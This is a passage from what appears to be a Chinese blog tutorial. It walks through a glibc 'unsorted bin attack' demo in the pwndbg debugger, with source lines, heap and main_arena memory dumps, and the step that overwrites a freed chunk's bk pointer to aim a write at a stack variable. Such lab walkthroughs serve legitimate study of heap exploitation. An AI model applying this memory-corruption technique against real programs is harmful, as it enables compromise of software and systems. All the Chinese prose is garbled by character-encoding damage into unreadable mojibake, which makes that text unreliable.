class="hljs-number">0x400a18</span><br>   <span class="hljs-number">0x400740</span> &lt;main+<span class="hljs-number">154</span>&gt;    mov    rdi, rax<br>   <span class="hljs-number">0x400743</span> &lt;main+<span class="hljs-number">157</span>&gt;    mov    eax, <span class="hljs-number">0</span><br>   <span class="hljs-number">0x400748</span> &lt;main+<span class="hljs-number">162</span>&gt;    call   <span class="hljs-built_in">fprintf</span>@plt &lt;<span class="hljs-built_in">fprintf</span>@plt&gt;<br> <br>   <span class="hljs-number">0x40074d</span> &lt;main+<span class="hljs-number">167</span>&gt;    mov    rax, qword ptr [rip + <span class="hljs-number">0x20090c</span>] &lt;<span class="hljs-number">0x601060</span>&gt;<br>   <span class="hljs-number">0x400754</span> &lt;main+<span class="hljs-number">174</span>&gt;    mov    rcx, rax<br>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ SOURCE (CODE) ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br>In file: /home/ubuntu/Desktop/unsortedbin_demo/demo.c<br>    <span class="hljs-number">7</span>     <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"å®é™…ä¸Šè¿™ç§æ”»å‡»æ–¹æ³•å¸¸å¸¸ç”¨æ¥ä¿®æ”¹ global_max_fast æ¥ä¸ºè¿›ä¸€æ­¥çš„ fastbin attack åšå‡†å¤‡\n\n"</span>);<br>    <span class="hljs-number">8</span> <br>    <span class="hljs-number">9</span>     <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> stack_var=<span class="hljs-number">0</span>;<br>   <span class="hljs-number">10</span>     <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"æˆ‘ä»¬å‡†å¤‡æŠŠè¿™ä¸ªåœ°æ–¹ %p çš„å€¼ %ld æ›´æ”¹ä¸ºä¸€ä¸ªå¾ˆå¤§çš„æ•°\n\n"</span>, &amp;stack_var, stack_var);<br>   <span class="hljs-number">11</span> <br> â–º <span class="hljs-number">12</span>     <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *p=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x410</span>);<br>   <span class="hljs-number">13</span>     <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"ä¸€å¼€å§‹å…ˆç”³è¯·ä¸€ä¸ªæ¯”è¾ƒæ­£å¸¸çš„ chunk: %p\n"</span>,p);<br>   <span class="hljs-number">14</span>     <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"å†åˆ†é…ä¸€ä¸ªé¿å…ä¸ top chunk åˆå¹¶\n\n"</span>);<br>   <span class="hljs-number">15</span>     <span class="hljs-built_in">malloc</span>(<span class="hljs-number">500</span>);<br>   <span class="hljs-number">16</span> <br>   <span class="hljs-number">17</span>     <span class="hljs-built_in">free</span>(p);<br>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ STACK ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br><span class="hljs-number">00</span>:<span class="hljs-number">0000</span>â”‚ rsp  <span class="hljs-number">0x7fffffffdd70</span> â€”â–¸ <span class="hljs-number">0x400870</span> (__libc_csu_init) â—‚â€” push   r15<br><span class="hljs-number">01</span>:<span class="hljs-number">0008</span>â”‚      <span class="hljs-number">0x7fffffffdd78</span> â—‚â€” <span class="hljs-number">0x0</span><br><span class="hljs-number">02</span>:<span class="hljs-number">0010</span>â”‚      <span class="hljs-number">0x7fffffffdd80</span> â€”â–¸ <span class="hljs-number">0x7fffffffde70</span> â—‚â€” <span class="hljs-number">0x1</span><br><span class="hljs-number">03</span>:<span class="hljs-number">0018</span>â”‚      <span class="hljs-number">0x7fffffffdd88</span> â—‚â€” <span class="hljs-number">0xbfb16d8983641800</span><br><span class="hljs-number">04</span>:<span class="hljs-number">0020</span>â”‚ rbp  <span class="hljs-number">0x7fffffffdd90</span> â€”â–¸ <span class="hljs-number">0x400870</span> (__libc_csu_init) â—‚â€” push   r15<br><span class="hljs-number">05</span>:<span class="hljs-number">0028</span>â”‚      <span class="hljs-number">0x7fffffffdd98</span> â€”â–¸ <span class="hljs-number">0x7ffff7a2d840</span> (__libc_start_main+<span class="hljs-number">240</span>) â—‚â€” mov    edi, eax<br><span class="hljs-number">06</span>:<span class="hljs-number">0030</span>â”‚      <span class="hljs-number">0x7fffffffdda0</span> â—‚â€” <span class="hljs-number">0x1</span><br><span class="hljs-number">07</span>:<span class="hljs-number">0038</span>â”‚      <span class="hljs-number">0x7fffffffdda8</span> â€”â–¸ <span class="hljs-number">0x7fffffffde78</span> â€”â–¸ <span class="hljs-number">0x7fffffffe20d</span> â—‚â€” <span class="hljs-string">'/home/ubuntu/Desktop/unsortedbin_demo/demo'</span><br>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ BACKTRACE ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br> â–º f <span class="hljs-number">0</span>           <span class="hljs-number">400722</span> main+<span class="hljs-number">124</span><br>   f <span class="hljs-number">1</span>     <span class="hljs-number">7f</span>fff7a2d840 __libc_start_main+<span class="hljs-number">240</span><br>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure><p>çœ‹ä¸€ä¸‹è¿™æ—¶çš„æœ¬åœ°å˜é‡æƒ…å†µï¼š</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; info local<br>stack_var = <span class="hljs-number">0</span><br>p = <span class="hljs-number">0x7fffffffde70</span><br>pwndbg&gt; x/<span class="hljs-number">5</span>gx &amp;stack_var<br><span class="hljs-number">0x7fffffffdd78</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x00007fffffffde70</span><br><span class="hljs-number">0x7fffffffdd88</span>:<span class="hljs-number">0xbfb16d8983641800</span><span class="hljs-number">0x0000000000400870</span><br><span class="hljs-number">0x7fffffffdd98</span>:<span class="hljs-number">0x00007ffff7a2d840</span><br>pwndbg&gt; x/<span class="hljs-number">5</span>gx &amp;p<br><span class="hljs-number">0x7fffffffdd80</span>:<span class="hljs-number">0x00007fffffffde70</span><span class="hljs-number">0xbfb16d8983641800</span><br><span class="hljs-number">0x7fffffffdd90</span>:<span class="hljs-number">0x0000000000400870</span><span class="hljs-number">0x00007ffff7a2d840</span><br><span class="hljs-number">0x7fffffffdda0</span>:<span class="hljs-number">0x0000000000000001</span><br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure><p>ä»ä¸Šé¢çš„ä»£ç æ¡†å¯ä»¥çœ‹åˆ°ï¼Œæ­¤æ—¶ï¼š<br>â— stack_varçš„å€¼ä¸º0ï¼Œæ­¤å˜é‡çš„åœ°å€ä¸º0x7fffffffdd78<br>â— pçš„å€¼ä¸º0x7fffffffde70ï¼Œæ­¤å˜é‡çš„åœ°å€ä¸º0x7fffffffdd80</p><h3 id="æ‰§è¡Œunsigned-long-p-x3D-malloc-0x410"><a href="#æ‰§è¡Œunsigned-long-p-x3D-malloc-0x410" class="headerlink" title="æ‰§è¡Œunsigned long *p=malloc(0x410);"></a>æ‰§è¡Œunsigned long *p=malloc(0x410);</h3><p>å¯¹ä»£ç çš„ç¬¬13è¡Œä¸‹æ–­ç‚¹ï¼Œè®©ç¨‹åºæ‰§è¡Œï¼šunsigned long *p=malloc(0x410);  ç»§ç»­æŸ¥çœ‹å†…å­˜ï¼š</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; heap<br>Allocated chunk<br>Addr: <span class="hljs-number">0x602000</span><br>Size: <span class="hljs-number">0x00</span><br>pwndbg&gt; top_chunk<br>Top chunk<br>Addr: <span class="hljs-number">0x602420</span><br>Size: <span class="hljs-number">0x00</span><br>pwndbg&gt; info local<br>stack_var = <span class="hljs-number">0</span><br>p = <span class="hljs-number">0x602010</span><br>pwndbg&gt; x/<span class="hljs-number">160</span>gx <span class="hljs-number">0x602000</span><br><span class="hljs-number">0x602000</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000421</span> #malloc_chunk1<br><span class="hljs-number">0x602010</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x602020</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>......ï¼ˆçœç•¥å†…å®¹å‡ä¸ºç©ºï¼‰<br><span class="hljs-number">0x602420</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000020be1</span> #top_chunk<br>......ï¼ˆçœç•¥å†…å®¹å‡ä¸ºç©ºï¼‰<br><span class="hljs-number">0x6024f0</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; x/<span class="hljs-number">16</span>gx &amp;main_arena<br><span class="hljs-number">0x7ffff7dd1b20</span> &lt;main_arena&gt;:<span class="hljs-number">0x0000000100000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b30</span> &lt;main_arena+<span class="hljs-number">16</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b40</span> &lt;main_arena+<span class="hljs-number">32</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b50</span> &lt;main_arena+<span class="hljs-number">48</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b60</span> &lt;main_arena+<span class="hljs-number">64</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b70</span> &lt;main_arena+<span class="hljs-number">80</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000602420</span> #top_chunk<br><span class="hljs-number">0x7ffff7dd1b80</span> &lt;main_arena+<span class="hljs-number">96</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x00007ffff7dd1b78</span><br><span class="hljs-number">0x7ffff7dd1b90</span> &lt;main_arena+<span class="hljs-number">112</span>&gt;:<span class="hljs-number">0x00007ffff7dd1b78</span><span class="hljs-number">0x00007ffff7dd1b88</span><br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure><h3 id="æ‰§è¡Œmalloc-500"><a href="#æ‰§è¡Œmalloc-500" class="headerlink" title="æ‰§è¡Œmalloc(500);"></a>æ‰§è¡Œmalloc(500);</h3><p>ç°åœ¨æŒ‡é’ˆpæŒ‡å‘malloc_dataï¼Œç´§æ¥ç€å¯¹ä»£ç çš„ç¬¬17è¡Œä¸‹æ–­ç‚¹è®©ç¨‹åºæ‰§è¡Œï¼šmalloc(500);ï¼Œç»§ç»­æŸ¥çœ‹å†…å­˜ï¼š</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; heap<br>Allocated chunk<br>Addr: <span class="hljs-number">0x602000</span><br>Size: <span class="hljs-number">0x00</span><br><br>pwndbg&gt; top_chunk<br>Top chunk<br>Addr: <span class="hljs-number">0x602620</span><br>Size: <span class="hljs-number">0x00</span><br>pwndbg&gt; x/<span class="hljs-number">16</span>gx &amp;main_arena <br><span class="hljs-number">0x7ffff7dd1b20</span> &lt;main_arena&gt;:<span class="hljs-number">0x0000000100000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b30</span> &lt;main_arena+<span class="hljs-number">16</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b40</span> &lt;main_arena+<span class="hljs-number">32</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b50</span> &lt;main_arena+<span class="hljs-number">48</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b60</span> &lt;main_arena+<span class="hljs-number">64</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b70</span> &lt;main_arena+<span class="hljs-number">80</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000602620</span> #top_chunk<br><span class="hljs-number">0x7ffff7dd1b80</span> &lt;main_arena+<span class="hljs-number">96</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x00007ffff7dd1b78</span><br><span class="hljs-number">0x7ffff7dd1b90</span> &lt;main_arena+<span class="hljs-number">112</span>&gt;:<span class="hljs-number">0x00007ffff7dd1b78</span><span class="hljs-number">0x00007ffff7dd1b88</span><br>pwndbg&gt; x/<span class="hljs-number">300</span>gx <span class="hljs-number">0x602000</span><br><span class="hljs-number">0x602000</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000421</span> #malloc_chunk1<br>......ï¼ˆçœç•¥å†…å®¹å‡ä¸ºç©ºï¼‰<br><span class="hljs-number">0x602420</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000201</span> #malloc_chunk1<br>......ï¼ˆçœç•¥å†…å®¹å‡ä¸ºç©ºï¼‰<br><span class="hljs-number">0x602620</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x00000000000209e1</span> #top_chunk<br>......ï¼ˆçœç•¥å†…å®¹å‡ä¸ºç©ºï¼‰<br><span class="hljs-number">0x602950</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure><p>æ­¤å¤„åˆmallocä¸€ä¸ªç©ºé—´æ˜¯ä¸ºäº†é¿å…malloc_chunk1ä¸top_chunkç›¸é‚»è€Œå¯¼è‡´çš„åœ¨free chunk1æ—¶ä¸å›æ”¶åˆ°unsortedbinã€‚</p><blockquote><p><strong>é‡Šæ”¾ä¸€ä¸ªä¸å±äºfastbinçš„chunkï¼Œå¹¶ä¸”è¯¥chunkä¸å’Œtop_chunkç´§é‚»æ—¶ï¼Œè¯¥chunkä¼šé¦–å…ˆè¢«æ”¾åˆ°unsortedbinä¸­ã€‚</strong></p></blockquote><h3 id="æ‰§è¡Œfree-p"><a href="#æ‰§è¡Œfree-p" class="headerlink" title="æ‰§è¡Œfree(p)"></a>æ‰§è¡Œfree(p)</h3><p>å¯¹ä»£ç çš„ç¬¬18è¡Œä¸‹æ–­ç‚¹ï¼Œç¨‹åºå°†ä¼šæ‰§è¡Œï¼šfree(p);  ç»§ç»­è¿è¡Œç¨‹åºï¼ŒæŸ¥çœ‹å†…å­˜ï¼š</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c">unsortedbin<br>all [corrupted]<br>FD: <span class="hljs-number">0x602000</span> â—‚â€” <span class="hljs-number">0x0</span><br>BK: <span class="hljs-number">0x602000</span> â€”â–¸ <span class="hljs-number">0x7ffff7dd1b78</span> (main_arena+<span class="hljs-number">88</span>) â—‚â€” <span class="hljs-number">0x602000</span><br>pwndbg&gt; x/<span class="hljs-number">16</span>gx <span class="hljs-number">0x602000</span><br><span class="hljs-number">0x602000</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000421</span> <span class="hljs-meta">#unsortedbin</span><br><span class="hljs-number">0x602010</span>:<span class="hljs-number">0x00007ffff7dd1b78</span><span class="hljs-number">0x00007ffff7dd1b78</span><br>    <span class="hljs-meta">#fd#bk</span><br><span class="hljs-number">0x602020</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x602030</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x602040</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x602050</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x602060</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x602070</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; x/<span class="hljs-number">30</span>gx &amp;main_arena<br><span class="hljs-number">0x7ffff7dd1b20</span> &lt;main_arena&gt;:<span class="hljs-number">0x0000000100000000</span><span class="hljs-number">0x0000000000000000</span><br>......(çœç•¥å†…å®¹å‡ä¸ºç©º)<br><span class="hljs-number">0x7ffff7dd1b70</span> &lt;main_arena+<span class="hljs-number">80</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000602620</span> <br> #æŒ‡å‘top_chunk<br><span class="hljs-meta">#unsortedbinæŒ‡å‘çš„åœ°æ–¹</span><br><span class="hljs-number">0x7ffff7dd1b80</span> &lt;main_arena+<span class="hljs-number">96</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000602000</span> <br>    <span class="hljs-meta">#unsortedbin</span><br><span class="hljs-number">0x7ffff7dd1b90</span> &lt;main_arena+<span class="hljs-number">112</span>&gt;:<span class="hljs-number">0x0000000000602000</span><span class="hljs-number">0x00007ffff7dd1b88</span><br><span class="hljs-number">0x7ffff7dd1ba0</span> &lt;main_arena+<span class="hljs-number">128</span>&gt;:<span class="hljs-number">0x00007ffff7dd1b88</span><span class="hljs-number">0x00007ffff7dd1b98</span><br><span class="hljs-number">0x7ffff7dd1bb0</span> &lt;main_arena+<span class="hljs-number">144</span>&gt;:<span class="hljs-number">0x00007ffff7dd1b98</span><span class="hljs-number">0x00007ffff7dd1ba8</span><br><span class="hljs-number">0x7ffff7dd1bc0</span> &lt;main_arena+<span class="hljs-number">160</span>&gt;:<span class="hljs-number">0x00007ffff7dd1ba8</span><span class="hljs-number">0x00007ffff7dd1bb8</span><br><span class="hljs-number">0x7ffff7dd1bd0</span> &lt;main_arena+<span class="hljs-number">176</span>&gt;:<span class="hljs-number">0x00007ffff7dd1bb8</span><span class="hljs-number">0x00007ffff7dd1bc8</span><br><span class="hljs-number">0x7ffff7dd1be0</span> &lt;main_arena+<span class="hljs-number">192</span>&gt;:<span class="hljs-number">0x00007ffff7dd1bc8</span><span class="hljs-number">0x00007ffff7dd1bd8</span><br><span class="hljs-number">0x7ffff7dd1bf0</span> &lt;main_arena+<span class="hljs-number">208</span>&gt;:<span class="hljs-number">0x00007ffff7dd1bd8</span><span class="hljs-number">0x00007ffff7dd1be8</span><br><span class="hljs-number">0x7ffff7dd1c00</span> &lt;main_arena+<span class="hljs-number">224</span>&gt;:<span class="hljs-number">0x00007ffff7dd1be8</span><span class="hljs-number">0x00007ffff7dd1bf8</span><br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure><p>åœ¨ä¹‹å‰çš„æ–‡ç« ä¸­æˆ‘ä»¬è¯´è¿‡ï¼Œå½“unsortedbinåªæœ‰ä¸€ä¸ªfree_chunkæ—¶ï¼Œå®ƒçš„fdå’ŒbkæŒ‡é’ˆéƒ½æŒ‡å‘unsortedbinæœ¬èº«ã€‚</p><p class='item-img' data-src='https://s2.loli.net/2023/09/13/brF2m8PKZeOVvRt.png'><img src="https://s2.loli.net/2023/09/13/brF2m8PKZeOVvRt.png" alt="Snipaste_2023-09-13_20-40-59.png"></p><h3 id="æ‰§è¡Œp-1-x3D-unsigned-long-amp-stack-var-2"><a href="#æ‰§è¡Œp-1-x3D-unsigned-long-amp-stack-var-2" class="headerlink" title="æ‰§è¡Œp[1]=(unsigned long)(&amp;stack_var-2);"></a>æ‰§è¡Œp[1]=(unsigned long)(&amp;stack_var-2);</h3><p>å¯¹ä»£ç ç¬¬21è¡Œä¸‹æ–­ç‚¹ï¼Œç»§ç»­ï¼šp[1]=(unsigned long)(&amp;stack_var-2);</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; x/<span class="hljs-number">16</span>gx <span class="hljs-number">0x602000</span><br><span class="hljs-number">0x602000</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000421</span><br><span class="hljs-number">0x602010</span>:<span class="hljs-number">0x00007ffff7dd1b78</span><span class="hljs-number">0x00007fffffffdd68</span><br>    <span class="hljs-meta">#fd#bkè¢«æ›´æ”¹</span><br><span class="hljs-number">0x602020</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x602030</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x602040</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x602050</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x602060</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x602070</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure><p>ç°åœ¨æˆ‘ä»¬å·²ç»æ›´æ”¹äº†unsortedbinä¸­malloc_chunk1æŒ‡é’ˆä¸º0x00007fffffffdd68ã€‚åˆšå¥½æ˜¯åˆšæ‰ç”³è¯·çš„ stack_var - 0x10 çš„ä½ç½®</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><br>pwndbg&gt; unsortedbin <br>unsortedbin<br>all [corrupted]<br>FD: <span class="hljs-number">0x602000</span> â—‚â€” <span class="hljs-number">0x0</span><br>BK: <span class="hljs-number">0x602000</span> â€”â–¸ <span class="hljs-number">0x7ffff7dd1b78</span> (main_arena+<span class="hljs-number">88</span>) â—‚â€” <span class="hljs-number">0x602000</span><br>pwndbg&gt; x/<span class="hljs-number">16</span>gx <span class="hljs-number">0x00007fffffffdd68</span><br><span class="hljs-number">0x7fffffffdd68</span>:<span class="hljs-number">0x00000000004007a8</span><span class="hljs-number">0x0000000000400870</span><br>    <span class="hljs-meta">#unsortedbinä¸­bkæŒ‡é’ˆæ‰€æŒ‡å‘çš„åœ°æ–¹</span><br><span class="hljs-number">0x7fffffffdd78</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000602010</span><br>    #æƒ³è¦è¢«ä¿®æ”¹ä¸ºè¶…å¤§å€¼çš„åœ°æ–¹<br><span class="hljs-number">0x7fffffffdd88</span>:<span class="hljs-number">0xbfb16d8983641800</span><span class="hljs-number">0x0000000000400870</span><br><span class="hljs-number">0x7fffffffdd98</span>:<span class="hljs-number">0x00007ffff7a2d840</span><span class="hljs-number">0x0000000000000001</span><br><span class="hljs-number">0x7fffffffdda8</span>:<span class="hljs-number">0x00007fffffffde78</span><span class="hljs-number">0x00000001f7ffcca0</span><br><span class="hljs-number">0x7fffffffddb8</span>:<span class="hljs-number">0x00000000004006a6</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7fffffffddc8</span>:<span class="hljs-number">0x9c796560ff5ea285</span><span class="hljs-number">0x00000000004005b0</span><br><span class="hljs-number">0x7fffffffddd8</span>:<span class="hljs-number">0x00007fffffffde70</span><span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure><h3 id="æ‰§è¡Œmalloc-0x410"><a href="#æ‰§è¡Œmalloc-0x410" class="headerlink" 